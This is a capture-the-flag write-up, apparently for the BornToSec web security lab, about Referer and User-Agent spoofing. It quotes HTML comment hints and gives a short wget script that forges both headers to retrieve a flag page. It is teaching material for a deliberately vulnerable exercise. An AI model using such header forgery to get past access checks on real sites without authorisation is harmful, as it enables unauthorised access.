# Referer Spoofing

There is the link with `© BornToSec` title at the bottom of each page.

From inspecting this page we have two clues about vulnerability.

```html
<!--
    You must comming from: "https://www.nsa.gov/" to go to the next step.
-->
...
<!--
    Let's use this browser: "ft_bornToSec". It will help you a lot.
-->
```

The first one lead us to 'Referer' HTTP-header substitution. The second one tells us to change 'User-agent' header as well.

To exploit this vulnerability we're using `wget` with `--user-agent` and `referer` options. This manipulation could also be done with `curl`.

<details>
    <summary>Shell script that does the trick</summary>

```bash
#!/bin/bash


OUTPUT_FILE=./index.html
wget -q --user-agent='ft_bornToSec' \
     --referer 'https://www.nsa.gov/' \
     --output-document=$OUTPUT_FILE \
"http://$IPADDR/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c"

cat $OUTPUT_FILE | grep flag
```

</details>

## References
Follow [this](https://en.wikipedia.org/wiki/Referer_spoofing) page for more details.